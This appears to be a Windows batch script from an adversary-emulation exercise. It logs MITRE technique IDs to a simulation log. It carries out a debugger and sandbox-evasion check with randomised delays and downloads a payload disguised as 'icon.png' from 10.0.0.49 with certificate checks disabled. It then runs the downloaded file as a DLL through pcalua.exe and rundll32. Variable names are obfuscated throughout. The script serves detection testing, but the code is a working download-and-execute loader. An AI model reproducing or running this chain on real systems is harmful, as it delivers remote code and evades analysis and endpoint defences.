@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET zfxywl=%APPDATA%\10818\0547260d
SET qmnbjt=a67bca44.txt
SET rvcsta=https://10.0.0.49/stage/2/icon.png?10818-7
SET lphdng=BALAM-S2BO
SET mjkwse=10818
SET tbqcyn=7
SET dhxofg=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Initial delay 10-20s
timeout /t 15 /nobreak >nul

REM Start anti-analysis (T1497): Debugger.IsAttached check
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: debugger_check_start>> "!dhxofg!" 2>nul || ver>nul
powershell -Command "if ([System.Diagnostics.Debugger]::IsAttached) { exit 0 } else { exit 1 }" >nul 2>&1
if errorlevel 0 (
    REM Debugger detected, add random sleep 2000-5000ms
    SET /A antisleep=%RANDOM% %% 3000 + 2000
    timeout /t !antisleep! /nobreak >nul
)
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: debugger_check_complete>> "!dhxofg!" 2>nul || ver>nul
REM Log T1497 – Virtualization/Sandbox Evasion
echo [!tsvar!][TTP][!lphdng!][!mjkwse!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!dhxofg!" 2>nul || ver>nul

REM Delay between operations (5-15s, vary method)
ping -n 10 127.0.0.1 >nul

REM Heartbeat fetch
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: heartbeat_start>> "!dhxofg!" 2>nul || ver>nul
curl -k -s -o "!zfxywl!\!qmnbjt!" "!rvcsta!"
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: heartbeat_complete>> "!dhxofg!" 2>nul || ver>nul

REM Another delay
CHOICE /C Y /N /D Y /T 8 >nul

REM Change working directory
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: chdir_start>> "!dhxofg!" 2>nul || ver>nul
cd /d "!zfxywl!" >nul 2>&1
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: chdir_result=0>> "!dhxofg!" 2>nul || ver>nul

REM Invoke Stage 2 Loader DLL via pcalua -> rundll32 (T1218)
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: rundll32_start>> "!dhxofg!" 2>nul || ver>nul
pcalua.exe -a C:\Windows\System32\rundll32.exe -c "!zfxywl!\!qmnbjt!,RunSimulation"
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: rundll32_complete>> "!dhxofg!" 2>nul || ver>nul
REM Log T1218 – System Binary Proxy Execution
echo [!tsvar!][TTP][!lphdng!][!mjkwse!]: T1218|System Binary Proxy Execution=OK:>> "!dhxofg!" 2>nul || ver>nul

REM Additional delays to meet total 30-60s
timeout /t 10 /nobreak >nul
SET /A randdelay=%RANDOM% %% 20 + 10
timeout /t !randdelay! /nobreak >nul

REM Final debug – script ending
echo [!tsvar!][DEBUG][!lphdng!][!mjkwse!]: script_end>> "!dhxofg!" 2>nul || ver>nul

endlocal